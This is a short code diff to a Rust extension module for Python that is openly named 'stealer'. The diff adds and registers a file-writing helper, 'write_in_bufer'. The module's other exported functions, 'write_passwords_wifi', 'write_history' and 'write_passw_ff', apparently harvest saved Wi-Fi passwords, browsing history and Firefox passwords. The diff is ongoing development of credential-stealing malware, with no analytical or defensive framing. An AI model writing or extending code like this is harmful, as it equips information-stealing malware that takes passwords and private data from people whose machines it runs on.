@@ -194,7 +194,14 @@ fn create_directory_if_not_exists(directory_path: &str) -> PyResult<()> {
     Ok(())
 }
 
+#[pyfunction]
+fn write_in_bufer(file_path: &str, bufer: &str) -> PyResult<()> {
+    let mut file = File::create(file_path)?;
 
+    writeln!(file, "{}", bufer)?;
+
+    Ok(())
+}
 
 #[pymodule]
 fn stealer(_py: Python, m: &PyModule) -> PyResult<()> {
@@ -206,5 +213,6 @@ fn stealer(_py: Python, m: &PyModule) -> PyResult<()> {
     m.add_function(wrap_pyfunction!(write_passwords_wifi, m)?)?;
     m.add_function(wrap_pyfunction!(write_history, m)?)?;
     m.add_function(wrap_pyfunction!(write_passw_ff, m)?)?;
+    m.add_function(wrap_pyfunction!(write_in_bufer, m)?)?;
     Ok(())
 }
